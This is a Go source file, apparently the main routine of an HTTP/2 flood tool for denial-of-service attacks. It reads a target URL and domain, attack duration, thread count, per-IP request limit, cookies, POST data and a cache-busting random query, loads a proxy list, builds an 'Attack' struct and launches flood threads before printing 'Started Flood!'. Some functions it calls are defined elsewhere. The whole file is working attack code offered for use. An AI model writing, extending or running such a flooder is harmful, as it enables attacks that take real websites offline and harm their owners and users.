package main

import (
	"fmt"
	//"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var UserAgents = make(map[int]string)
var LoadedProxies = make(map[int]string)
var RsIP int
var ThreadSync sync.WaitGroup

var Sys System

func InitializeUserAgents() {
	for y, x := range Agents {
		UserAgents[y] = x
	}
}

func randomString(length int) string {
    rand.Seed(time.Now().UnixNano())
    b := make([]byte, length)
    rand.Read(b)
    return fmt.Sprintf("%x", b)[:length]
}

func main() {
	InitializeUserAgents()
	rand.Seed(time.Now().UnixNano())
	ShareBanner := Parser()
	if len(os.Args) < 8 {
		fmt.Println(len(os.Args))
		fmt.Println(ShareBanner)
		return
	}

	var HTTPVersion string
	var url string
	var domain string
	var limit int
	var Good string
	var threads int
	var mode string
	var user_agent string
	var randomstring string
	var rand_query string
	var dur int
	var cookie interface{}
	var data interface{}
	fmt.Sprint(HTTPVersion)

	Arguments := os.Args[1:]
	for _, x := range Arguments {
			   if strings.Contains(x, "version=") {
			HTTPVersion = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "url=") {
			url = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "domain=") {
			domain = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "time=") {
			dur, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "limit=") {
			limit, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "threads=") {
			threads, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "mode=") {
			mode = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "cookie=") {
			cookie = strings.Split(x, "cookie=")[1]
		} else if strings.Contains(x, "user_agent=") {
			user_agent = strings.Split(x, "user_agent=")[1]
		} else if strings.Contains(x, "data=") {
			data = strings.Split(x, "data=")[1]
		} else if strings.Contains(x, "good=") {
			Good = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "rand_query=") {
			// Т.к. в rand_query бывает знак "=", то из-за Split его не будет. Получаем параметр по-другому.
			rand_query = strings.Replace(x, "rand_query=", "", -1)
		} else {
			if !strings.Contains(x, "cookie=") {
				cookie = nil
			} else if !strings.Contains(x, "data=") {
				data = nil
			} else if !strings.Contains(x, "getpost=") {
				mode = "GET"
			} else if !strings.Contains(x, "user_agent=") {
				user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
			}
			
			fmt.Println(ShareBanner)
		}
	}
	
	// При наличии добавляем случайный параметр в конец
	if (len(rand_query) > 0) {
		randomstring = randomString(10) // генерируем случайную строку
		url = url + rand_query + randomstring
	}
	
	parsed := Good
	prox := strings.Split(parsed, "\n")
	for i, p := range prox {
		LoadedProxies[i] = p
	}	

	New := Attack{
		Url: url,
		Host: domain,
		AttackMethod: mode,
		PostData: data,
		RequestsPerIP: limit,
		Cookie: cookie,
		Jokeragent: user_agent,
	}
	Sys = System{
		Banner: ShareBanner,
		HTTP2Timeout: 10000,
		Attack: &New,
	}

	for x := 0; x < threads; x++ {
		go HTTP2(&ThreadSync)
		ThreadSync.Add(1)
	}
	ThreadSync.Wait()
	close(start)
	fmt.Println("Started Flood!")
	time.Sleep(time.Duration(dur)*time.Second)
}